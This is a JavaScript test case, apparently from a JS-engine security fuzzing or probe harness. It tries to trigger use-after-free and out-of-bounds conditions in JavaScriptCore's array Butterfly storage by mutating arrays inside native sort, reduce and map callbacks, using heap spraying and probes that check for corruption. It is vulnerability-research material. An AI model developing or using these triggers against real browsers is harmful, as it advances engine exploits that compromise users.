import { GCOracle } from '../mod_executor.js';

export default {
    id:       'NATIVE_CALLBACK_MUTATION_UAF',
    category: 'CoreJS',
    risk:     'HIGH',
    description:
        'Funções nativas C++ (sort, reduce, map) com callback JS que muta o array. ' +
        'Atacam o ponteiro de Butterfly cacheado pelo C++ durante iteração. ' +
        'Variante map() em array Holey testa OOB write quando Butterfly é realocado.',

    setup: function() {
        this.log = [];
        this.attacked = { sort: false, reduce: false, map: false };
    },

    trigger: function() {
        this.sortArr = Array.from({ length: 60 }, (_, i) => 60.0 - i); 
        
        // 🚨 Oráculo: Verifica se o array foi varrido completamente
        if (GCOracle.registry) {
            GCOracle.registry.register(this.sortArr, `${this.id}_sortArr`);
        }

        try {
            this.sortArr.sort((a, b) => {
                if (!this.attacked.sort) {
                    this.attacked.sort = true;
                    this.sortArr.length = 0;
                    const trash = [];
                    for (let i = 0; i < 15; i++) trash.push(new ArrayBuffer(512 * 1024));
                }
                return a - b;
            });
        } catch(e) { this.log.push({ phase: 'sort', err: e.constructor.name }); }

        this.reduceArr = Array.from({ length: 40 }, (_, i) => i * 1.1);
        try {
            this.reduceArr.reduce((acc, val, idx) => {
                if (!this.attacked.reduce && idx === 10) {
                    this.attacked.reduce = true;
                    for (let i = 0; i < 1000; i++) this.reduceArr.push(i * 2.2);
                }
                return acc + val;
            }, 0);
        } catch(e) { this.log.push({ phase: 'reduce', err: e.constructor.name }); }

        this.mapArr = [1.1, 2.2, 3.3];
        this.mapArr[200] = 4.4; 
        try {
            this.mapResult = this.mapArr.map((val, idx) => {
                if (!this.attacked.map && idx === 1) {
                    this.attacked.map = true;
                    this.mapArr.length = 0;
                    this.mapArr.push(...Array(5).fill(99.9));
                }
                return val * 2;
            });
        } catch(e) { this.log.push({ phase: 'map', err: e.constructor.name }); }
    },

    probe: [
        s => s.sortArr.length,        
        s => s.sortArr[0],            
        s => s.sortArr[59],
        s => typeof s.sortArr[0],
        s => s.reduceArr.length,      
        s => s.reduceArr[0],
        s => s.reduceArr[39],         
        s => s.reduceArr[1039],       
        s => s.mapArr.length,         
        s => s.mapArr[0],
        s => s.mapResult?.length,     
        s => s.mapResult?.[0],        
        s => s.mapResult?.[200],      
        s => s.log.length,
        s => s.log.map(e => e.phase + ':' + e.err).join(',') || 'none',
        s => Object.values(s.attacked).filter(Boolean).length, 
    ],

    cleanup: function() {
        this.sortArr   = null;
        this.reduceArr = null;
        this.mapArr    = null;
        this.mapResult = null;
    }
};
